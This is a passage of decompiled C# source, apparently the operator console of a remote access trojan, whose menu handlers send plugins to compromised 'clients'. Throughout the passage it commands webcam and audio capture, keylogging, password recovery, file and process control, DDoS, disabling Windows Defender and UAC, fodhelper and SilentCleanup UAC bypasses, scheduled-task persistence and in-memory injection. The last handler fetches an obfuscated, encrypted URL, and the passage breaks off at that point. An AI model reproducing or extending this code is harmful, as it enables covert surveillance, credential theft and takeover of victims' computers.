				if (listView1.SelectedItems.Count <= 0)
				{
					return;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\RC.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormWebcam)Application.OpenForms["Webcam:" + clients.ID] == null)
					{
						FormWebcam formWebcam = new FormWebcam();
						formWebcam.Name = "Webcam:" + clients.ID;
						formWebcam.F = this;
						formWebcam.Text = "Webcam:" + clients.ID;
						formWebcam.ParentClient = clients;
						formWebcam.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Camera");
						formWebcam.Show();
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void FileManagerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FM.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormFileManager)Application.OpenForms["fileManager:" + clients.ID] == null)
					{
						FormFileManager formFileManager = new FormFileManager();
						formFileManager.Name = "fileManager:" + clients.ID;
						formFileManager.Text = "fileManager:" + clients.ID;
						formFileManager.F = this;
						formFileManager.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID);
						formFileManager.Show();
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void ProcessManagerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PM.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormProcessManager)Application.OpenForms["processManager:" + clients.ID] == null)
					{
						FormProcessManager formProcessManager = new FormProcessManager();
						formProcessManager.Name = "processManager:" + clients.ID;
						formProcessManager.Text = "processManager:" + clients.ID;
						formProcessManager.F = this;
						formProcessManager.ParentClient = clients;
						formProcessManager.Show();
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private async void SendFileToDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "exe files (*.exe)|*.exe|All files (*.*)|*.*";
				openFileDialog.Multiselect = true;
				if (openFileDialog.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				MsgPack packet = new MsgPack();
				packet.ForcePathObject("Pac_ket").AsString = "sendFile";
				packet.ForcePathObject("Update").AsString = "false";
				MsgPack msgpack = new MsgPack();
				msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients client in selectedClients)
				{
					client.LV.ForeColor = Color.Red;
					string[] fileNames = openFileDialog.FileNames;
					foreach (string file in fileNames)
					{
						await Task.Run(delegate
						{
							packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
							packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
							msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
						});
						client.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void SendFileToMemoryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				FormSendFileToMemory formSendFileToMemory = new FormSendFileToMemory();
				formSendFileToMemory.ShowDialog();
				if (formSendFileToMemory.IsOK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMemory";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSendFileToMemory.toolStripStatusLabel1.Tag.ToString())));
					if (formSendFileToMemory.comboBox1.SelectedIndex == 0)
					{
						msgPack.ForcePathObject("Inject").AsString = "";
					}
					else
					{
						msgPack.ForcePathObject("Inject").AsString = formSendFileToMemory.comboBox2.Text;
					}
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SM.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
				}
				formSendFileToMemory.Close();
				formSendFileToMemory.Dispose();
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void MessageBoxToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				string text = InputDialog.Show("Message");
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendMessage";
					msgPack.ForcePathObject("Message").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ex.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void ChatToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormChat)Application.OpenForms["chat:" + clients.ID] == null)
					{
						FormChat formChat = new FormChat();
						formChat.Name = "chat:" + clients.ID;
						formChat.Text = "chat:" + clients.ID;
						formChat.F = this;
						formChat.ParentClient = clients;
						formChat.Show();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void VisteWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = InputDialog.Show("Visit URL");
				if (!string.IsNullOrEmpty(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "visitURL";
					msgPack.ForcePathObject("URL").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ex.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void ChangeWallpaperToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				if (listView1.SelectedItems.Count <= 0)
				{
					return;
				}
				using OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "All Graphics Types|*.bmp;*.jpg;*.jpeg;*.png";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "wallpaper";
					msgPack.ForcePathObject("Image").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
					msgPack.ForcePathObject("Exe").AsString = Path.GetExtension(openFileDialog.FileName);
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ex.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\LG.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormKeylogger)Application.OpenForms["keyLogger:" + clients.ID] == null)
					{
						FormKeylogger formKeylogger = new FormKeylogger();
						formKeylogger.Name = "keyLogger:" + clients.ID;
						formKeylogger.Text = "keyLogger:" + clients.ID;
						formKeylogger.F = this;
						formKeylogger.FullPath = Path.Combine(Application.StartupPath, "ClientsFolder", clients.ID, "Keylogger");
						formKeylogger.Show();
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void StartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				string text = InputDialog.Show("Alert when process is active,put input name!");
				if (!string.IsNullOrEmpty(text))
				{
					lock (Settings.LockReportWindowClients)
					{
						Settings.ReportWindowClients.Clear();
						Settings.ReportWindowClients = new List<Clients>();
					}
					Settings.ReportWindow = true;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
					msgPack.ForcePathObject("Option").AsString = "run";
					msgPack.ForcePathObject("Title").AsString = text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void StopToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				Settings.ReportWindow = false;
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
				msgPack.ForcePathObject("Option").AsString = "stop";
				lock (Settings.LockReportWindowClients)
				{
					foreach (Clients reportWindowClient in Settings.ReportWindowClients)
					{
						ThreadPool.QueueUserWorkItem(reportWindowClient.Send, msgPack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void StopToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "close";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void RestartToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void UpdateToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using OpenFileDialog openFileDialog = new OpenFileDialog();
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "sendFile";
					msgPack.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
					msgPack.ForcePathObject("FileName").AsString = Path.GetFileName(openFileDialog.FileName);
					msgPack.ForcePathObject("Update").AsString = "true";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "uninstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				Clients[] selectedClients = GetSelectedClients();
				if (selectedClients.Length == 0)
				{
					Process.Start(Application.StartupPath);
					return;
				}
				Clients[] array = selectedClients;
				foreach (Clients clients in array)
				{
					string text = Path.Combine(Application.StartupPath, "ClientsFolder\\" + clients.ID);
					if (Directory.Exists(text))
					{
						Process.Start(text);
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void RebootToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "restart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void ShutDownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "shutdown";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void LogoutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "pcOptions";
				msgPack.ForcePathObject("Option").AsString = "logoff";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void BlockToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using FormBlockClients formBlockClients = new FormBlockClients();
			formBlockClients.ShowDialog();
		}

		private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			notifyIcon1.Dispose();
			Environment.Exit(0);
		}

		private void FileSearchToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using FormFileSearcher formFileSearcher = new FormFileSearcher();
			if (formFileSearcher.ShowDialog() == DialogResult.OK && listView1.SelectedItems.Count > 0)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "fileSearcher";
				msgPack.ForcePathObject("SizeLimit").AsInteger = (long)formFileSearcher.numericUpDown1.Value * 1000 * 1000;
				msgPack.ForcePathObject("Extensions").AsString = formFileSearcher.txtExtnsions.Text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\FS.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.Red;
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
		}

		private void InformationToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (listView1.SelectedItems.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "information";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\IF.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void dDOSToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (listView1.Items.Count > 0)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "dosAdd";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ML.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
					formDOS.Show();
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void EncryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void DecryptToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void DisableWDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableDefedner";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ex.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if (clients.LV.SubItems[lv_admin.Index].Text == "Admin")
					{
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void RecordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormAudio)Application.OpenForms["Audio Recorder:" + clients.ID] == null)
					{
						FormAudio formAudio = new FormAudio();
						formAudio.Name = "Audio Recorder:" + clients.ID;
						formAudio.Text = "Audio Recorder:" + clients.ID;
						formAudio.F = this;
						formAudio.ParentClient = clients;
						formAudio.Client = clients;
						formAudio.Show();
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void RunasToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "uac";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if (clients.LV.SubItems[lv_admin.Index].Text != "Administrator")
					{
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void SilentCleanupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if (clients.LV.SubItems[lv_admin.Index].Text != "Administrator")
					{
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void SchtaskInstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "schtaskinstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void PasswordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Rec.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void FodhelperToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass3";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if (clients.LV.SubItems[lv_admin.Index].Text != "Administrator")
					{
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void DisableUACToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "disableUAC";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ex.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if (clients.LV.SubItems[lv_admin.Index].Text == "Admin")
					{
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void CompMgmtLauncherToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "uacbypass2";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if (clients.LV.SubItems[lv_admin.Index].Text != "Administrator")
					{
						clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void DocumentToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = new StreamReader(new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(Decrypts("kwBPZ0ubY1vrM8FoBi6L0H4k7wr1NcznROh2Gd1y5sz4mDs5G3ULCsnjrf1j4ej7"))))).ReadToEnd();
			if (text.Contains("\\odeg"))
			{
				new Thread((ThreadStart)delegate
				{
